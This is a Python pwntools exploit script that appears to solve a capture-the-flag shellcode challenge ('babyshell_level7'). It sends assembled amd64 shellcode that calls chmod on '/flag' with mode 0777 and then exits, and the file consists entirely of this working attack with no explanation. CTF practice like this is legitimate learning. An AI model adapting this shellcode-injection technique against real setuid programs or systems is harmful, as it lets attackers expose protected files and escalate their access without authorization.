from pwn import *

context.arch = 'amd64'
context.log_level = "debug"
#context.terminal=['tmux','splitw','-h']

p = process('/challenge/babyshell_level7')

shellcode = """
    mov rax, 0x67616c662f 
    push rax

    mov rdi, rsp
    mov rsi, 0777
    mov rax, 90
    syscall

    mov rax, 60
    xor rdi, rdi
    syscall

"""

shellcode = asm(shellcode)

p.send(shellcode)

p.interactive()
